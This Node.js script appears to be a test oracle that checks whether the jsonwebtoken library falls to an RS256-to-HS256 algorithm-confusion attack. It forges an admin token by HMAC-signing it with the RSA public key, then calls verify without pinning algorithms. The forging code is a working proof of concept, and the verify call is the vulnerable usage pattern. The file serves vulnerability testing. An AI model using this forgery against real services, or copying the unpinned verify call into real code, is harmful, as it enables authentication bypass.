'use strict';
const jwt = require('jsonwebtoken');
const crypto = require('crypto');

function main() {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  try {
    const marker = 'JWT_ORACLE_' + Date.now() + '_' + Math.random().toString(36).slice(2);

    // Server holds an RSA key pair and signs tokens with RS256, as is
    // typical for asymmetric JWT setups (e.g. OIDC-style token issuance).
    const { publicKey, privateKey } = crypto.generateKeyPairSync('rsa', {
      modulusLength: 2048,
      publicKeyEncoding: { type: 'spki', format: 'pem' },
      privateKeyEncoding: { type: 'pkcs8', format: 'pem' }
    });

    // --- Benign operation first: normal RS256 sign/verify roundtrip. ---
    const benignToken = jwt.sign({ marker, role: 'user' }, privateKey, { algorithm: 'RS256' });
    const benignDecoded = jwt.verify(benignToken, publicKey);

    if (!benignDecoded || benignDecoded.marker !== marker || benignDecoded.role !== 'user') {
      console.log('ORACLE_RESULT ' + JSON.stringify({
        operation_completed: false,
        exploit_succeeded: false,
        evidence: 'Benign RS256 sign/verify roundtrip failed to produce expected payload.'
      }));
      return;
    }

    operation_completed = true;

    // --- Malicious attempt: RS256 -> HS256 algorithm-confusion attack. ---
    // The public key is, by design, public. A server that calls
    // jwt.verify(token, publicKey) WITHOUT explicitly pinning
    // `algorithms: ['RS256']` is vulnerable: the attacker can forge a
    // token whose header claims alg: 'HS256' and sign it using HMAC with
    // the PEM-encoded public key string as the shared secret. Because
    // jwt.verify() in the vulnerable version trusts the algorithm
    // specified in the (attacker-controlled) token header when no
    // `algorithms` allow-list is supplied, it will treat the public key
    // as an HMAC secret and successfully validate the forged signature,
    // granting the attacker arbitrary claims (role: 'admin').
    const forgedHeader = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
    const forgedPayload = Buffer.from(JSON.stringify({ marker, role: 'admin' })).toString('base64url');
    const signingInput = forgedHeader + '.' + forgedPayload;
    const forgedSig = crypto.createHmac('sha256', publicKey).update(signingInput).digest('base64url');
    const forgedToken = signingInput + '.' + forgedSig;

    try {
      // Vulnerable usage pattern: no `algorithms` restriction supplied,
      // mirroring real-world misuse where developers pass the RSA public
      // key directly to verify() and rely on the library's defaults.
      const forgedDecoded = jwt.verify(forgedToken, publicKey);

      if (forgedDecoded && forgedDecoded.marker === marker && forgedDecoded.role === 'admin') {
        exploit_succeeded = true;
        evidence = 'jwt.verify() accepted a forged RS256->HS256 algorithm-confusion token, decoding payload: ' + JSON.stringify(forgedDecoded);
      } else {
        exploit_succeeded = false;
        evidence = 'jwt.verify() returned an unexpected result for forged token: ' + JSON.stringify(forgedDecoded);
      }
    } catch (verifyErr) {
      exploit_succeeded = false;
      evidence = 'Forged RS256->HS256 token was rejected by jwt.verify(): ' + (verifyErr && verifyErr.message ? verifyErr.message : String(verifyErr));
    }

    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed,
      exploit_succeeded,
      evidence
    }));
  } catch (err) {
    console.log('ORACLE_RESULT ' + JSON.stringify({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unexpected exception: ' + (err && err.message ? err.message : String(err))
    }));
  }
}

main();
